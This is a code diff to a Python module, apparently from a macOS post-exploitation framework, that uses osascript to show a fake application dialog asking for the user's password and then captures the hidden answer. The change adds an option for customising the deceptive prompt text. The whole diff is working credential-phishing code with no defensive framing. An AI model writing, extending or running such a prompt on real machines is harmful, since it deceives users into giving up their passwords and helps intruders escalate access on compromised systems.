@@ -52,6 +52,12 @@ class Module:
                 'Description'   :   'Switch. List applications suitable for launching.',
                 'Required'      :   False,
                 'Value'         :   ''
+            },
+            'Message' : {
+                # The 'Agent' option is the only one that MUST be in a module
+                'Description'   :   'Custom text that will be displayed in the prompt window.',
+                'Required'      :   False,
+                'Value'         :   ''
             }
         }
 
@@ -74,7 +80,12 @@ class Module:
 
         listApps = self.options['ListApps']['Value']
         appName = self.options['AppName']['Value']
+        message = self.options['Message']['Value']
 
+        #sets default message if no customization is done
+        if message == "":
+        	message = appName + " requires your password to continue."
+        
         if listApps != "":
             script = """
 import os
@@ -91,7 +102,7 @@ print '\\n'.join(choices)
             # osascript prompt for the specific application
             script = """
 import os
-print os.popen('osascript -e \\\'tell app "%s" to activate\\\' -e \\\'tell app "%s" to display dialog "%s requires your password to continue." & return  default answer "" with icon 1 with hidden answer with title "%s Alert"\\\'').read()
-""" % (appName, appName, appName, appName)
+print os.popen('osascript -e \\\'tell app "%s" to activate\\\' -e \\\'tell app "%s" to display dialog "%s" & return  default answer "" with icon 1 with hidden answer with title "%s Alert"\\\'').read()
+""" % (appName, appName, message, appName)
 
         return script
